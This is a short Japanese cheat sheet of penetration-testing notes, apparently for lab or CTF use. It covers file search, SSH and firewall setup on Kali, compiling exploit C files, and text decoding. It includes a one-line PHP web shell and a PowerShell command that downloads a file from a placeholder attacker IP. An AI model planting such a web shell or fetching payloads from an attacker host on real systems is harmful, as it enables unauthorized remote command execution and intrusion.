# Linuxでファイルの検索と権限の同時表示

```zsh
find / -name [file] -type f 2>/dev/null | xargs ls -la
```
- 「コマンドA | xargs コマンドB」で、コマンドAの実行結果を引数にしてコマンドBを実行

---

# シンプルなPHP Webシェル

```php
<?php echo system($_GET["cmd"]); ?>
```

---

# PowershellでのPowerShellスクリプトのダウンロード

```powershell
(New-Object Net.WebClient).DownloadFile('http://[AttackerIP]:[Port]/[FileName]', '[path to download]') 
```
- `New-Object` コマンドレットを使用して `Net.WebClient` クラスの新しいインスタンスを作成している。`Net.WebClient` は実際には `System.Net.WebClient` クラスの省略形。NETフレームワークの。
- `System.Net.WebClient` クラスのインスタンスが生成されると、このインスタンスによりWebサーバーとの通信が可能になり、指定したURLからファイルをダウンロードするために `.DownloadFile` メソッドが利用できるようになる

---

# Kali Linuxでssh

- スタート
```zsh
sudo service ssh start
```
- 確認
```zsh
sudo systemctl status ssh
```
- FWの設定で22ポートを許可する
```zsh
sudo iptables -I INPUT -p tcp --dport 22 -j ACCEPT
```
- 確認
```zsh
sudo iptables -L
```

- FWの設定を取り消す
```zsh
sudo iptables -D INPUT -p tcp --dport 22 -j ACCEPT
```
- ストップする
```zsh
sudo service ssh stop
```

- *注意*：winRMから接続したときは対話的なターミナルを開くことができないのでエラーが起きるが、ssh自体は問題なく使える。

---

# C言語ファイルのコンパイル・実行手順

⚠️：Windows環境でコンパイルすることを想定しているファイルはKali Linux上でコンパイル不可

1. コンパイル
```zsh
gcc [example.c] -o [example]
```
- コンパイル時にエラーが出た場合は、オプション `-Wall` を使って詳細エラーを見る。

エラー例と対処：
- `undefined reference to 'get_kernel_syms'` → 古いカーネル用。新しいカーネルでは使えない。
- `implicit declaration of function 'printf'` → `#include <stdio.h>` が必要。

2. 実行
```zsh
./[example]
```
- 一部は引数を必要とするものもあるので、`./exploit --help` や `cat exploit.c` で使用法を確認すること

---

# 文字の変換

抽出
```zsh
# 例：awk -F: '{print $1}' test.txt
awk -F<区切り文字> '{print $<num>}' <file>
```
- admin:testとあるとき、`{print $1}`とすることで、adminを抽出

デコード
```zsh
echo '<string>' | base64 -d
echo '<biinary_char>' | xxd -p
```